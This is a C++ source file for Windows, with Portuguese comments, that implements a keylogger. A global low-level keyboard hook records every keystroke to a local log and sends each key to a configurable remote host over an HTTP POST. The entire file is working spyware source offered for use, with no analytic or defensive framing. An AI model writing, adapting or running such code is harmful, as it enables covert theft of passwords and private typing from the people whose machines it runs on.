#include <windows.h>
#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>

HHOOK hHook = NULL;
int port = 88;
const char *site = "10.0.2.15"; // input your site here

int WriteToFile(int a){
    std::ofstream outfile;
    outfile.open("log.txt", std::ios_base::app);
    switch(a){
        case 0:
            outfile << "[S]";
            break;
        case 8:
            outfile << "[B]";
            break;
        default:
            outfile << char(a);
            break;
    }
    outfile.close();
}

int sendCharToSocket(const char *caractere) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    // Inicializar Winsock
    std::cout << "Inicializando Winsock..." << std::endl;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cout << "Falha na inicialização do Winsock. Código: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Criar socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        std::cout << "Falha ao criar socket. Código: " << WSAGetLastError() << std::endl;
        return 1;
    }
    std::cout << "Socket criado com sucesso." << std::endl;

    // Configurar o endereço do servidor
    server.sin_addr.s_addr = inet_addr(site);  // IP do servidor
    server.sin_family = AF_INET;
    server.sin_port = htons(port);  // Porta do servidor

    // Conectar ao servidor
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        std::cout << "Falha ao conectar ao servidor." << std::endl;
        return 1;
    }

    std::cout << "Conectado ao servidor." << std::endl;

    // Enviar uma solicitação simples ao servidor
    char message[256];
    sprintf(message, "POST / HTTP/1.1\r\nHost: %s\r\nContent-Type: text/plain\r\nContent-Length: %lu\r\n\r\n%s",
            site, strlen(caractere), caractere);

    if (send(sock, message, strlen(message), 0) < 0) {
        std::cout << "Falha ao enviar mensagem." << std::endl;
        return 1;
    }
    std::cout << "Solicitação enviada." << std::endl;

    // Receber resposta
    char buffer[2000];
    int response_len = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (response_len < 0) {
        std::cout << "Falha ao receber resposta." << std::endl;
    } else {
        buffer[response_len] = '\0';  // Terminar a string corretamente
        std::cout << "Resposta recebida: " << std::endl << buffer << std::endl;
    }

    // Fechar o socket
    closesocket(sock);
    WSACleanup();

    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // Verifica se a tecla foi pressionada
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = pKeyboard->vkCode;
            
            
            int a = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
            WriteToFile(a);
            sendCharToSocket((const char *) &a);
            
            std::cout << a << " ";
        }
    }
    
    // Passa o controle para o próximo hook
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

BOOL WINAPI CtrlHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        UnhookWindowsHookEx(hHook); // Unhook the hook here
        exit(0);
    }
    return TRUE;
}

int main() {
    SetConsoleCtrlHandler(CtrlHandler, TRUE);

    // Define o hook de teclado global
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        std::cout << "Falha ao instalar o hook!" << std::endl;
        return 1;
    }
    
    std::cout << "Capturando teclas... Pressione ESC para sair." << std::endl;

    // Fica em um loop infinito, processando mensagens do sistema
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        // Sai do loop se a tecla ESC for pressionada
        if (msg.message == WM_QUIT) {
            break;
        }
    }

    // Remove o hook quando o programa termina
    UnhookWindowsHookEx(hHook);

    return 0;
}